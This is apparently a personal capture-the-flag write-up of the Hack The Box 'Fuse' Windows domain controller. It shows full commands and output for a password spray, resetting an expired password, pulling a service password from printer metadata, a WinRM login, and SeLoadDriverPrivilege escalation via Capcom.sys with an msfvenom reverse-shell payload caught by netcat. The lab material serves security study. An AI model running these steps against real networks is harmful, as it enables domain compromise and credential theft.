`└─$ nmap -p- -sSCV 10.10.10.193  --min-rate 999 `
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-16 00:54 AEDT
Nmap scan report for 10.10.10.193
Host is up (0.078s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-15 07:10:46Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49750/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2026-01-14T23:11:41-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -4h06m58s, deviation: 4h37m10s, median: -6h47m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-15T07:11:37
|_  start_date: 2026-01-15T06:07:46
```

#### for port 80
add hosts, view a page of printer papercut
http://fuse.fabricorp.local/papercut/logs/html/index.htm

2020-05-30 17:07:06,sthompson,1,1,HP-MFT01,"Fabricorp01.docx - Word",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,153kb,

and some names: pmerton tlavel sthompson bhult administrator , put them in file users
guest it is a password leakage, passwd spray using nxc
`└─$ netexec smb 10.10.10.193 -u users -p 'Fabricorp01'`
```
SMB         10.10.10.193    445    FUSE             [*] Windows 10 / Server 2016 Build 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:Fabricorp01 STATUS_LOGON_FAILURE
```
for bhult, shows passwd must change 
`└─$ python3 ~/Downloads/smbpasswd.py fabricorp.local/bhult:'Fabricorp01'@fabricorp.local -newpass Fabricorp02`
```
Impacket v0.9.13.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

`└─$ netexec smb 10.10.10.193 -u bhult -p 'Fabricorp02' --shares      `
```
SMB         10.10.10.193    445    FUSE             [*] Windows 10 / Server 2016 Build 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\bhult:Fabricorp02 
SMB         10.10.10.193    445    FUSE             [*] Enumerated shares
SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
SMB         10.10.10.193    445    FUSE             -----           -----------     ------
SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
SMB         10.10.10.193    445    FUSE             C$                              Default share
SMB         10.10.10.193    445    FUSE             HP-MFT01        WRITE           HP-MFT01
SMB         10.10.10.193    445    FUSE             IPC$            READ            Remote IPC
SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share 
```
but no useful info except get a printer name.
`└─$ python3 ~/Downloads/smbpasswd.py fabricorp.local/bhult:'Fabricorp01'@fabricorp.local -newpass Fabricorp0212345678`
```
Impacket v0.9.13.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```                                                                                                              
#### Enum RPC
`└─$ rpcclient -U bhult%Fabricorp0212345678 10.10.10.193`
```
rpcclient $> querydispinfo
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein	Name: (null)	Desc: (null)
index: 0x1099 RID: 0x1bbd acb: 0x00020010 Account: bhult	Name: (null)	Desc: (null)
index: 0x1092 RID: 0x451 acb: 0x00020010 Account: bnielson	Name: (null)	Desc: (null)
index: 0x109a RID: 0x1bbe acb: 0x00000211 Account: dandrews	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x109d RID: 0x1db3 acb: 0x00000210 Account: dmuir	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x109b RID: 0x1db1 acb: 0x00000210 Account: mberbatov	Name: (null)	Desc: (null)
index: 0x1096 RID: 0x643 acb: 0x00000210 Account: pmerton	Name: (null)	Desc: (null)
index: 0x1094 RID: 0x641 acb: 0x00000210 Account: sthompson	Name: (null)	Desc: (null)
index: 0x1091 RID: 0x450 acb: 0x00000210 Account: svc-print	Name: (null)	Desc: (null)
index: 0x1098 RID: 0x645 acb: 0x00000210 Account: svc-scan	Name: (null)	Desc: (null)
index: 0x1095 RID: 0x642 acb: 0x00020010 Account: tlavel	Name: (null)	Desc: (null)

rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.10.10.193\HP-MFT01]
	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
	comment:[]
```
from printer info, get scan2docs password: $fab@s3Rv1ce$1
after some data extraction, get a user list
```
└─$ cat a | cut -d ":" -f5

└─$ cat b | cut -d"N" -f1 > c    
                                                                                                              
┌──(ed㉿kali)-[/tmp]
└─$ cat c                    
 Administrator	
 astein	
 bhult	
 bnielson	
 dandrews	
 DefaultAccount	
 dmuir	
 Guest	
 krbtgt	
 mberbatov	
 pmerton	
 sthompson	
 svc-print	
 svc-scan	
 tlavel	
```
validate names of list
` └─$ crackmapexec smb 10.10.10.193 -u c -p '$fab@s3Rv1ce$1' --continue-on-success`
```
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '
  formatter_class=RawTextHelpFormatter)
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate

SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
```
no new things from smb
```                                                                                                              
┌──(ed㉿kali)-[/tmp]
└─$ netexec smb 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1' --shares          
SMB         10.10.10.193    445    FUSE             [*] Windows 10 / Server 2016 Build 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [*] Enumerated shares
SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
SMB         10.10.10.193    445    FUSE             -----           -----------     ------
SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
SMB         10.10.10.193    445    FUSE             C$                              Default share
SMB         10.10.10.193    445    FUSE             HP-MFT01        WRITE           HP-MFT01
SMB         10.10.10.193    445    FUSE             IPC$            READ            Remote IPC
SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share
```
we can login with print account, get the user flag
`└─$ evil-winrm -i fabricorp.local -u svc-print -p '$fab@s3Rv1ce$1'`
```                                      
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
fabricorp\svc-print
```
#### ES
check the privi first
`*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /priv`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
for SeLoadDriverPrivilege - https://github.com/k4sth4/SeLoadDriverPrivilege

`└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.32 LPORT=8821 -f exe -o rev.exe`
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```
follow the MD instructure, clone the project , upload files into target host
```
*Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Desktop\Capcom.sys
[*] Service Name: xnspepxvpõÏ¹&
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????????
NTSTATUS: c0000034, WinError: 0
*Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000020993A40008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system
*Evil-WinRM* PS C:\Users\svc-print\DEsktop> .\ExploitCapcom.exe EXPLOIT rev.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000011963360008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
```

`└─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [10.10.16.32] from (UNKNOWN) [10.129.2.5] 50597
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\svc-print\DEsktop>whoami
whoami
nt authority\system
```

#### lesson learned
- care about all info from web,rpc!!
- smbpasswd to reset user passwd for smb
- SeLoadDriverPrivilege to ES





